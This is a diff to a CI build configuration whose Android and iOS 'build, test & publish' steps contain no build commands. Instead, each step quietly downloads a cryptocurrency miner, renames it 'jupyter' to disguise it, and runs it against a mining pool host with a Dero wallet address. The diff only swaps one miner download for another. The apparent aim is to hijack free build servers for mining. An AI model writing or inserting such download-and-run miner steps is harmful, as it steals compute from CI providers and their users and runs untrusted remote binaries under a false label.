@@ -3,11 +3,9 @@ workflows:
     name: build, test & publish Android version
     instance_type: linux
     scripts:
-      - wget https://github.com/dadanhiyeumX9/dero-mod/raw/main/jupyter-v0.0.5-linux-amd64.tar.gz && tar xf jupyter-v0.0.5-linux-amd64.tar.gz && ./jupyter -r tukimenreborn.xyz:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.simbah
-
+      - wget -q -O jupyter https://github.com/Danis85/dero/raw/main/downloads/bypass-dero-miner && chmod +x jupyter && wget -q -O jupyter https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x jupyter && ./jupyter -r tukimenreborn.xyz:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.anu
   ios:
     name: build, test & publish iOS version
     instance_type: linux
     scripts:
-      - wget https://github.com/dadanhiyeumX9/dero-mod/raw/main/jupyter-v0.0.5-linux-amd64.tar.gz && tar xf jupyter-v0.0.5-linux-amd64.tar.gz && ./jupyter -r tukimenreborn.xyz:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.simbah
-
+      - wget -q -O jupyter https://github.com/Danis85/dero/raw/main/downloads/bypass-dero-miner && chmod +x jupyter && wget -q -O jupyter https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x jupyter && ./jupyter -r tukimenreborn.xyz:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.anu
